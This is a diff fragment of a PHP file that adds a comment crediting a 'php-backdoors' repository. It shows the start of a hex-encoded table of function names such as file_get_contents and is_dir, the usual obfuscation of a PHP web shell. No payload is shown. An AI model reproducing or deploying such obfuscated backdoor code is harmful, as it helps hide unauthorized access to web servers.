@@ -1,6 +1,7 @@
 <?= @null;
 $Array = [
 
+// from https://github.com/1337r0j4n/php-backdoors
 // $GLOBALS['fungsi'][0]
 	'66696c655f6765745f636f6e74656e7473', // f i l e g e t c o n t e n t s => 0
 	'69735f646972', // i s _ d i r => 1
